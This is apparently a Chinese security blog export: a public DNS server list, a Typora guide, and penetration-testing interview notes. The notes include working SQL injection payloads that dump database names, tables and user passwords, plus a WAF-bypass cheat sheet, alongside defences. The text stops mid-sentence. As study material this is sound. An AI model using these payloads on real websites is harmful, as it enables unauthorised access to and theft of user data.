title="常用DNS 服务器"></a>常用DNS 服务器</h1><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209302142496.png" alt="image-20220930214205300"></p><h2 id="233-5-5-5阿里云223-5-5-5-x2F-223-6-6-6"><a href="#233-5-5-5阿里云223-5-5-5-x2F-223-6-6-6" class="headerlink" title="233.5.5.5阿里云223.5.5.5 &#x2F; 223.6.6.6"></a>233.5.5.5阿里云223.5.5.5 &#x2F; 223.6.6.6</h2><blockquote><ul><li>稳定(Stable)</li></ul><p>全球数百台服务器组成的集群,充足的带宽资源<br>自研高性能DNS系统和清洗中心，保障系统稳定和安全</p><ul><li>快速(Speedy)</li></ul><p>BGP anycast技术，让您访问最近的DNS集群<br>动态缓存技术，加速解析响应</p><ul><li>智能(Smart)</li></ul><p>精确的IP区域划分，解析结果更准确<br>即将支持edns-client-subnet 技术,调度精准</p></blockquote><h2 id="114-DNS：114-114-114-114"><a href="#114-DNS：114-114-114-114" class="headerlink" title="114 DNS：114.114.114.114"></a>114 DNS：114.114.114.114</h2><blockquote><ul><li>114DNS 的优势：</li></ul><p>高速 电信联通移动全国通用DNS，能引导您到最快的网站，手机和计算机都可用<br>稳定 DNS解析成功率超高，与默认DNS相比，使用114DNS可访问国内外更多的网站<br>可靠 3000万个家庭和企业DNS的后端技术支持，多次为电信运营商提供DNS灾备</p><ul><li>114DNS 的特色：</li></ul><p>纯净 无劫持 无需再忍受被强扭去看广告或粗俗网站之痛苦<br>拦截 钓鱼病毒木马网站 增强网银、证券、购物、游戏、隐私信息安全<br>学校或家长可选拦截 色情网站 保护少年儿童免受网络色情内容的毒害</p></blockquote><h2 id="8-8-8-8谷歌"><a href="#8-8-8-8谷歌" class="headerlink" title="8.8.8.8谷歌"></a>8.8.8.8谷歌</h2><h2 id="百度-DNS"><a href="#百度-DNS" class="headerlink" title="百度 DNS"></a>百度 DNS</h2><blockquote><p>DNS 地址：180.76.76.76</p><p>这是百度公司提供的公共 DNS 服务，百度 DNS 主页写的是云防护、无劫持、更精准。</p></blockquote><h2 id="DNSpod"><a href="#DNSpod" class="headerlink" title="DNSpod"></a>DNSpod</h2><blockquote><p>DNS 地址：电信：首选：101.226.4.6 联通：首选：123.125.81.6 移动：首选：101.226.4.6 铁通：首选：101.226.4.6</p><p>DNS 派旨在为用户提供一个高速、稳定、安全的上网环境，虽然知道 DNS 派的人可能不如百度 DNS、阿里 DNS 的多，不过 DNS 派的口碑还是不错的。</p></blockquote><h2 id="OneDNS"><a href="#OneDNS" class="headerlink" title="OneDNS"></a>OneDNS</h2><blockquote><p>OneDNS 主页：南方：112.124.47.27 北方：114.215.126.16</p><p>OneDNS 在接触的还是挺早的，不过倒不是使用他们的 DNS 而是 hosts。</p><p>OneDNS 收集了相当多的不良网站和恶意网站，当你使用了他们的 hosts 文件再遇到文件中的网站时将会直接被屏蔽。</p><p>OneDNS 还有广告屏蔽的功能，OneDNS 会屏蔽网站上的不良广告、比如包含恶意软件、粗俗的广告等等，这也是一个不错的功能。</p><p>对了，OneDNS 为了维持运营会在被拦截的页面下挂一个小广告，仅仅只是在被拦截的页面下挂的。基本没什么影响的。</p></blockquote><h1 id="配置DNS："><a href="#配置DNS：" class="headerlink" title="配置DNS："></a>配置DNS：</h1><blockquote><p>&#x2F;etc&#x2F;resolv.conf 将nameserver改成对应的DNS服务器</p><p>具体参考：<a href="https://11pmsleep.github.io/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Kali&Linux/Linux%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/">Linux 使用基础</a></p></blockquote><h1 id="常见的-DNS-安全攻击有哪些？"><a href="#常见的-DNS-安全攻击有哪些？" class="headerlink" title="常见的 DNS 安全攻击有哪些？"></a>常见的 DNS 安全攻击有哪些？</h1><blockquote><ul><li>缓存投毒：它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。</li><li>DNS（域名系统）劫持又叫域名劫持，指攻击者利用其他攻击手段，篡改了某个域名的解析结果，使得指向该域名的IP变成了另一个IP，导致对相应网址的访问被劫持到另一个不可达的或者假冒的网址，从而实现非法窃取用户信息或者破坏正常网络服务的目的。</li><li>DNS DDOS攻击：通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 应用层 </category>
          
          <category> DNS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora教程</title>
      <link href="/%E7%9F%A5%E8%AF%86/Notes/Typora%E6%95%99%E7%A8%8B.html"/>
      <url>/%E7%9F%A5%E8%AF%86/Notes/Typora%E6%95%99%E7%A8%8B.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Typora 是一款<strong>支持实时预览的 Markdown 文本编辑器</strong>。它有 OS X、Windows、Linux 三个平台的版本，并且是<strong>完全免费</strong>的。</p><h1 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h1><blockquote><ul><li>Typora官网主题: <strong><a href="https://theme.typora.io/">https://theme.typora.io/</a></strong></li><li>为 Typora 编写自定义主题: <strong><a href="https://theme.typora.io/doc/Write-Custom-Theme/">https://theme.typora.io/doc/Write-Custom-Theme/</a></strong></li></ul></blockquote><h2 id="安装主题方法"><a href="#安装主题方法" class="headerlink" title="安装主题方法"></a>安装主题方法</h2><ul><li>通过<code>文件 -&gt; 偏好设置 -&gt; 打开主题文件夹</code>打开theme目录</li><li>复制你想要的对应主题名称<code>*.css</code>后缀文件 到<code>theme</code>目录下然后重启, 选择菜单 -&gt; 主题</li></ul><h2 id="推荐主题"><a href="#推荐主题" class="headerlink" title="推荐主题"></a>推荐主题</h2><blockquote><p>去官网下载</p></blockquote><ol><li>Drake</li></ol><blockquote><p><a href="https://github.com/liangjingkanji/DrakeTyporaTheme">https://github.com/liangjingkanji/DrakeTyporaTheme</a></p></blockquote><ol start="2"><li>Night New</li><li>aspartate</li><li>cobalt</li><li>dyzj-dark</li><li>gitbook</li><li>haru</li><li>lanyue</li><li>mo</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209220113581.png" alt="image-20220922011346401" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Notes </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>考核题</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/%E8%80%83%E6%A0%B8%E9%A2%98.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/%E8%80%83%E6%A0%B8%E9%A2%98.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="考核题"><a href="#考核题" class="headerlink" title="考核题"></a>考核题</h1><ol><li>给你一个网站你要如何去进行漏洞测试(如淘宝,京东，仅从web页面)从登录页面开始，列举出你的思路。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 面试+笔试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/%E9%9D%A2%E8%AF%95%E9%A2%98.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>网安面试题</p><h1 id="基础问题"><a href="#基础问题" class="headerlink" title="基础问题"></a>基础问题</h1><h3 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">21：FTP（弱口令、匿名访问）</span><br><span class="line">22：SSH（弱口令）</span><br><span class="line">23：Telnet（弱口令、未授权访问）</span><br><span class="line">53：DNS</span><br><span class="line">445：SMB（弱口令、远程命令执行）</span><br><span class="line">1433：MSSQL（弱口令、提权）</span><br><span class="line">1521：oracle</span><br><span class="line">3306：MySQL（弱口令、提权）</span><br><span class="line">3389：RDP远程桌面（弱口令、远程代码执行）</span><br><span class="line">5432：postgresql</span><br><span class="line">6379：Redis（未授权访问）</span><br><span class="line">7001：Weblogic（弱口令、SSRF、反序列化漏洞）</span><br><span class="line">8080：TomCat（弱口令、启用PUT方法）</span><br><span class="line">27017：MongoDB（未授权访问</span><br></pre></td></tr></table></figure><h3 id="内网IP有哪些"><a href="#内网IP有哪些" class="headerlink" title="内网IP有哪些"></a>内网IP有哪些</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环路地址：127.0.0.1-127.0.0.255</span><br><span class="line">A 类：10.0.0.0-10.255.255.255</span><br><span class="line">B 类：172.16.0.0-172.31.255.255</span><br><span class="line">C 类：192.168.0.0-192.168.255.255</span><br></pre></td></tr></table></figure><h3 id="什么是负载均衡"><a href="#什么是负载均衡" class="headerlink" title="什么是负载均衡"></a>什么是负载均衡</h3><p><strong>负载均衡</strong>（Load Balance）是由<strong>多台服务器以对称的方式组成一个服务器集群</strong>，每台服务器都具有等价的地位，都可以单独对外提供服务而无须其他服务器的辅助。经过某种负载分管技术，将外部发送来的<strong>中央请求均匀分配</strong>到对称结构中的<strong>某一台服务器</strong>上。</p><blockquote><p><a href="https://www.cnblogs.com/mrhelloworld/p/nginx.html">https://www.cnblogs.com/mrhelloworld/p/nginx.html</a></p></blockquote><p><strong>负载均衡（Load Balance），意思是将负载（工作任务，访问请求）进行平衡、分摊到多个操作单元（服务器，组件）上进行执行。是解决高性能，单点故障（高可用），扩展性（水平伸缩）的终极解决方案。</strong></p><h3 id="通过-Linux-系统的-x2F-proc-⽬录，能够获取到哪些信息，这些信息可以在安全上有哪些应⽤？"><a href="#通过-Linux-系统的-x2F-proc-⽬录，能够获取到哪些信息，这些信息可以在安全上有哪些应⽤？" class="headerlink" title="通过 Linux 系统的 &#x2F; proc ⽬录，能够获取到哪些信息，这些信息可以在安全上有哪些应⽤？"></a>通过 Linux 系统的 &#x2F; proc ⽬录，能够获取到哪些信息，这些信息可以在安全上有哪些应⽤？</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/26923061#:~:text=proc%E7%9B%AE%E5%BD%95%E6%98%AF%E4%B8%80,%E5%86%85%E6%A0%B8%E7%9A%84%E8%BF%90%E8%A1%8C%E7%8A%B6%E6%80%81%E3%80%82"><strong>proc目录介绍</strong></a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /proc</span><br></pre></td></tr></table></figure><blockquote><p>获取系统信息，硬件信息，内核版本，加载的模块，进程信息</p></blockquote><h3 id="linux-系统中，检测哪些配置⽂件的配置项，能够提升-SSH-的安全性"><a href="#linux-系统中，检测哪些配置⽂件的配置项，能够提升-SSH-的安全性" class="headerlink" title="linux 系统中，检测哪些配置⽂件的配置项，能够提升 SSH 的安全性"></a>linux 系统中，检测哪些配置⽂件的配置项，能够提升 SSH 的安全性</h3><blockquote><p>&#x2F;etc&#x2F;ssh&#x2F;sshd___config iptables 配置</p></blockquote><h3 id="如何⼀条命令查看⽂件内容最后⼀百⾏"><a href="#如何⼀条命令查看⽂件内容最后⼀百⾏" class="headerlink" title="如何⼀条命令查看⽂件内容最后⼀百⾏"></a>如何⼀条命令查看⽂件内容最后⼀百⾏</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail -n 100 filename</span><br></pre></td></tr></table></figure><h3 id="Windows如何加固⼀个域环境下的-Windows-桌⾯⼯作环境？请给出你的思路"><a href="#Windows如何加固⼀个域环境下的-Windows-桌⾯⼯作环境？请给出你的思路" class="headerlink" title="Windows如何加固⼀个域环境下的 Windows 桌⾯⼯作环境？请给出你的思路"></a>Windows如何加固⼀个域环境下的 Windows 桌⾯⼯作环境？请给出你的思路</h3><blockquote></blockquote><h3 id="cookie和session"><a href="#cookie和session" class="headerlink" title="cookie和session"></a>cookie和session</h3><blockquote><ul><li>cookie的内容只存在在客户端，服务端直接从http请求包获取数据</li><li>session的内容存储在服务端，http请求头中的cookie只是一个key，服务端通过这个key再从自身文件或者数据库等方式获取真正的数据</li></ul></blockquote><h3 id="序列化与反序列化的区别："><a href="#序列化与反序列化的区别：" class="headerlink" title="序列化与反序列化的区别："></a>序列化与反序列化的区别：</h3><blockquote><p>序列化：把对象转化为可传输的字节序列过程称为序列化</p><p>反序列化：把字节序列还原为对象的过程称为反序列化</p></blockquote><h3 id="临时目录是哪个文件夹？"><a href="#临时目录是哪个文件夹？" class="headerlink" title="临时目录是哪个文件夹？"></a>临时目录是哪个文件夹？</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux：/tmp ，/var/tmp</span><br><span class="line">Windows：C:\Windows\Temp</span><br></pre></td></tr></table></figure><h3 id="CMD-命令⾏如何查询远程终端开放端⼝"><a href="#CMD-命令⾏如何查询远程终端开放端⼝" class="headerlink" title="CMD 命令⾏如何查询远程终端开放端⼝"></a>CMD 命令⾏如何查询远程终端开放端⼝</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc  </span><br><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><h3 id="3389-⽆法连接的⼏种情况"><a href="#3389-⽆法连接的⼏种情况" class="headerlink" title="3389 ⽆法连接的⼏种情况"></a>3389 ⽆法连接的⼏种情况</h3><blockquote><ul><li><p>没开放 3389 端⼝   3389   端⼝</p></li><li><p>端⼝被修改防护拦截</p></li><li><p>处于内⽹ (需进⾏端⼝转发)</p></li></ul></blockquote><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>简要的说SQL注入漏洞产生的原因就是WEB应用程序对用户输入的合法性没有判断，并且前端传入的参数是攻击者可控的，并且带入数据库查询，达到了攻击者构造非法语句实现对数据库的任意操作。</p><ol><li>SQL注入漏洞的产生需要满足两个条件：</li></ol><blockquote><ul><li>参数用户可控：比如说插入恶意SQL语句,插入到能与SQL服务器交互的WEB表单、http请求头等用户可控参数</li><li>参数带入数据库查询：在后台与原SQL语句拼接，改变原先语法结构，最终被服务器执行</li></ul></blockquote><h2 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">按照注入点类型来分类</span><br><span class="line">（1）数字型注入点</span><br><span class="line">（2）字符型注入点</span><br><span class="line">（3）搜索型注入点</span><br><span class="line">按照数据提交的方式来分类</span><br><span class="line">（1）GET 注入</span><br><span class="line">（2）POST 注入</span><br><span class="line">（3）Cookie 注入</span><br><span class="line">（4）HTTP 头部注入</span><br><span class="line">按照执行效果来分类</span><br><span class="line">（1）基于布尔的盲注</span><br><span class="line">（2）基于时间的盲注</span><br><span class="line">（3）基于报错注入</span><br><span class="line">（4）联合查询注入</span><br><span class="line">（5）堆叠注入（仅当php中使用mysqli_multi_query()函数执行sql语句（一般情况下会使用mysqli_query()）</span><br><span class="line">（6）宽字节注入</span><br><span class="line">还有一些其他的类型</span><br><span class="line">（1）二次注入</span><br><span class="line">（2）增删改注入</span><br></pre></td></tr></table></figure><h2 id="sql漏洞探测方法"><a href="#sql漏洞探测方法" class="headerlink" title="sql漏洞探测方法"></a>sql漏洞探测方法</h2><blockquote><p><a href="https://www.jianshu.com/p/5de47d05e333">https://www.jianshu.com/p/5de47d05e333</a></p></blockquote><p>只要是带有参数的动态网页并且该网页访问了数据库，那么就有可能存在 SQL 注入。</p><blockquote><ol><li><p>先加单引号’、双引号”、等看看是否报错，如果报错就可能存在SQL注入漏洞了。</p></li><li><p>还有在URL后面加 and 1&#x3D;1 、 and 1&#x3D;2 看页面是否显示一样，显示不一样的话，肯定存在SQL注入漏洞了。</p></li><li><p>还有就是Timing Attack测试，也就是时间盲注。通过简单的条件语句比如 and 1&#x3D;2 是无法看出异常的。在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p><p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。</p></li><li><p>提交错误语句是否有异常，除此之外这些显示的错误可以通过 sleep, 修眠语句执⾏ 5 秒等，可以判断注入语句是否执行成功。</p></li></ol></blockquote><h2 id="SQL注入漏洞利用方式"><a href="#SQL注入漏洞利用方式" class="headerlink" title="SQL注入漏洞利用方式"></a>SQL注入漏洞利用方式</h2><p>具体看什么数据库类型，像 SQLSERVER 可以命令执⾏，MYSQL 写 shell 有些权限、也可以执⾏命令但是条件是在 lINUX 环境下。</p><blockquote><ul><li>数据查询（拖库）</li><li>文件读取</li><li>命令执行</li><li>提权</li></ul></blockquote><h2 id="sql注入一般步骤"><a href="#sql注入一般步骤" class="headerlink" title="sql注入一般步骤"></a>sql注入一般步骤</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#判断什么类型：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 --+    id=-1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+ </span></span><br><span class="line"></span><br><span class="line">#<span class="keyword">order</span> <span class="keyword">by</span>语句判断字段数量：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3 --+ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#联合查询获取显示位，显示在什么地方：</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+ </span></span><br><span class="line"></span><br><span class="line">#获取当前数据库：</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),3 --+ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#获取所有数据库：</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">--+ </span></span><br><span class="line"></span><br><span class="line">#获取当前数据库所以表名：</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#获取users表所有字段：</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users‘ --+ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">获取security.users表所有字段</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span><span class="comment">--+ </span></span><br><span class="line"></span><br><span class="line">#获取security.users表所有字段内容：</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,username,password from users --+</span></span><br></pre></td></tr></table></figure><h2 id="sql注入-waf的绕过方式"><a href="#sql注入-waf的绕过方式" class="headerlink" title="sql注入 waf的绕过方式"></a>sql注入 waf的绕过方式</h2><ol><li>语法层面</li></ol><blockquote><p>使用sql的一些冷门语法进行绕过，如注释，回车替代空格，大小写，换行等。一些被屏蔽的字符或者函数用等价的其他字符或者函数替代</p><p>若其他关键字符或函数被过滤：</p><blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#空格:</span><br><span class="line">括号绕过：<span class="keyword">select</span>(password)<span class="keyword">from</span>(users);</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>a等字符替代绕过：<span class="operator">%</span><span class="number">00</span>，<span class="operator">%</span><span class="number">09</span>，<span class="operator">%</span><span class="number">0</span>a，<span class="operator">%</span><span class="number">0</span>b，<span class="operator">%</span><span class="number">0</span>c，<span class="operator">%</span><span class="number">0</span>d，<span class="operator">%</span><span class="number">20</span>，<span class="operator">%</span><span class="number">2</span>b……</span><br><span class="line">(内联)注释替代绕过：<span class="comment">/**/</span>，<span class="operator">/</span><span class="operator">!</span><span class="operator">*</span><span class="operator">*</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line">#逗号：</span><br><span class="line">fromfor：substr(<span class="string">&#x27;asdzxcqwe&#x27;</span><span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">2</span>);</span><br><span class="line"><span class="keyword">join</span>：unionselect <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)c</span><br><span class="line"><span class="keyword">offset</span>：limit1 <span class="keyword">offset</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">#单引号：</span><br><span class="line">hex编码：SELECTpassword <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="number">0x61646D696E</span>  ‘roothex编码</span><br><span class="line"><span class="type">char</span>编码：SELECTFROM Users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="type">CHAR</span>(<span class="number">97</span>, <span class="number">100</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">110</span>)</span><br><span class="line"><span class="operator">%</span><span class="number">2527</span>：`magic_quotes_gpc`开启可用</span><br><span class="line"></span><br><span class="line">#比较符号：</span><br><span class="line">等于：<span class="operator">=</span>、<span class="keyword">like</span>、regexp、rlike（默认不匹配大小写，需添加关键字<span class="type">binary</span>）</span><br><span class="line">不等于：<span class="operator">!=</span>、<span class="operator">&lt;&gt;</span>`</span><br><span class="line">大小于：greatest()、least()</span><br><span class="line">selectgreatest(ord(<span class="string">&#x27;a&#x27;</span>),<span class="number">0</span>)<span class="operator">=</span><span class="number">97</span>;</span><br><span class="line">selectord(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">between</span> <span class="number">0</span> <span class="keyword">and</span> <span class="number">97</span></span><br><span class="line"><span class="keyword">select</span>(ord(substr(<span class="string">&#x27;asd&#x27;</span><span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)) <span class="keyword">in</span> (<span class="number">97</span>))</span><br><span class="line"><span class="keyword">Offset</span>（） https:<span class="operator">/</span><span class="operator">/</span>blog.csdn.net<span class="operator">/</span>u012927188<span class="operator">/</span>article<span class="operator">/</span>details<span class="operator">/</span><span class="number">41957879</span></span><br><span class="line">Ord() http:<span class="operator">/</span><span class="operator">/</span>www.manongjc.com<span class="operator">/</span>article<span class="operator">/</span><span class="number">885.</span>html</span><br><span class="line"></span><br><span class="line">#注释符：</span><br><span class="line"><span class="comment">-- -、%23、;%00、构造合法语句</span></span><br><span class="line"></span><br><span class="line">#等效函数：</span><br><span class="line">hex() bin()  ascii() ord()</span><br><span class="line">sleep() benchmark(<span class="number">5000000</span>,select1)</span><br><span class="line">concat_ws()  group_concat()</span><br><span class="line">mid() substr()  <span class="built_in">substring</span>()</span><br><span class="line">@<span class="variable">@user</span> <span class="keyword">user</span>()</span><br><span class="line">@<span class="variable">@datadir</span> datadir()</span><br><span class="line">…</span><br><span class="line"></span><br><span class="line">垃圾字符填充，缓冲区溢出绕过，分块传输等等</span><br></pre></td></tr></table></figure></blockquote></blockquote><ol start="2"><li>流量层面</li></ol><blockquote><ul><li>使用不同的编码传输</li><li>使用http协议的特性进行绕过，如分块传输，content-type为multipart&#x2F;form-data，超大数据包等</li></ul></blockquote><h2 id="如何突破注⼊时字符被转义？"><a href="#如何突破注⼊时字符被转义？" class="headerlink" title="如何突破注⼊时字符被转义？"></a>如何突破注⼊时字符被转义？</h2><blockquote><ul><li>宽字符注⼊</li><li>hex 编码绕过   编码绕过</li></ul></blockquote><h2 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h2><p>分为三个方面: <strong>参数过滤 , 预编译 以及 限制权限和报错</strong></p><blockquote><p>1.数据类型进行严格定义，数据长度进行严格规定。</p><blockquote><p>比如查询数据库某条记录的id，定义它为整型（强制类型转换），如果用户传来的数据不满足条件，要对数据进行过滤。数据长度也应该做严格限制，可以防止较长的SQL注入语句。</p></blockquote><p>2.对用户输入进转义过滤  ：例如通过转义将’转义为&#39;</p><p>3.基于攻击特征的匹配过滤  ：黑名单白名单、正则表达式过滤</p><blockquote><p>参数过滤以各种厂商以及代码的WAF为主,比如替换空格,关键字,双写,大小写,特殊字符转义</p></blockquote><p>4.采用sql语句预编译order by &#x2F; limit </p><blockquote><p>先将查询语句固定 通过函数将传参变为字符串 拼接字符串去执行 你的关键字根本不会当作关键字去执行。预编译主要依赖各种框架,比如Java的mybatis框架 和 PHP的 thinkphp框架</p><blockquote><p><a href="https://www.cnblogs.com/leezhxing/p/5282437.html">https://www.cnblogs.com/leezhxing/p/5282437.html</a></p></blockquote><blockquote><p><strong>为什么参数化查询可以防⽌ SQL 注⼊？</strong></p><p>使⽤参数化查询数据库服务器不会把参数的内容当作 sql 指令的⼀部分来执⾏，是在数据库完成 sql 指令的编译后才套⽤参数运⾏</p><p>简单的说: 参数化能防注⼊的原因在于, 语句是语句，参数是参数，参数的值并不是语句的⼀部分，数据库只按语句的语义跑</p></blockquote></blockquote><p>5.严格限制网站访问数据库的权限。 </p><blockquote><ul><li>禁⽤ root</li><li>禁⽌远程访问</li><li>禁⽌写⼊</li><li>单独帐号</li><li>禁⽌执⾏ system 等函数</li></ul></blockquote><p>6.避免直接向用户显示数据库错误。</p></blockquote><h2 id="时间盲注的函数"><a href="#时间盲注的函数" class="headerlink" title="时间盲注的函数"></a>时间盲注的函数</h2><blockquote><p>sleep，<a href="https://www.cnblogs.com/duanxz/p/3936759.html">BENCHMARK</a>，<a href="https://www.jianshu.com/p/a0cf96e0c2e2">GET_LOCK</a>是三个可以控制时间延迟返回结果的函数</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#其他函数</span><br><span class="line"><span class="keyword">left</span>(m,n) <span class="comment">--从左向右截取字符串m返回其前n位</span></span><br><span class="line">substr(m,<span class="number">1</span>,<span class="number">1</span>) <span class="comment">--取字符串m的左边第一位起，1字长的字符串</span></span><br><span class="line">ascii(m) <span class="comment">--返回字符m的ASCII码</span></span><br><span class="line">if(str1,str2,str3)<span class="comment">--如果str1正确就执行str2，否则执行str3</span></span><br><span class="line">sleep(m)<span class="comment">--使程序暂停m秒</span></span><br><span class="line">length(m) <span class="comment">--返回字符串m的长度</span></span><br><span class="line"><span class="built_in">count</span>(column_name) <span class="comment">--返回指定列的值的数目</span></span><br></pre></td></tr></table></figure><h2 id="你知道几个常用的报错注入函数？"><a href="#你知道几个常用的报错注入函数？" class="headerlink" title="你知道几个常用的报错注入函数？"></a>你知道几个常用的报错注入函数？</h2><ul><li>MySQL</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">updatexml(); extractvalue();       </span><br><span class="line">#第二个参数包含特殊字符会报错，主要用来构造xpath语法错误。第二个参数如果不满足要求，则会报错，并且将查询结果放在报错信息里。</span><br><span class="line">#报错信息都会有报错长度限制，我们得到的数据有限</span><br><span class="line"><span class="built_in">floor</span>();                 #用来取整,不是数值就会报错。可以用来构造主键重复</span><br><span class="line"><span class="built_in">exp</span>() ；#用来构造整形溢出的错误</span><br></pre></td></tr></table></figure><ul><li>SQLserver</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">convert</span>();   #用来类型转换,第二个参数包含特殊字符会报错</span><br><span class="line"><span class="built_in">cast</span>();        #用来类型转换,参数包含特殊字符会报错</span><br></pre></td></tr></table></figure><ul><li><p>Oracle：没有报错函数,可以用比较运算符报错</p></li><li><p>Access：不支持报错注入,只能使用枚举</p></li></ul><h2 id="报错注入的原理是什么？"><a href="#报错注入的原理是什么？" class="headerlink" title="报错注入的原理是什么？"></a>报错注入的原理是什么？</h2><p>在MYSQL中使用一些指定的函数来人为制造报错，后台没有屏蔽数据库报错信息， 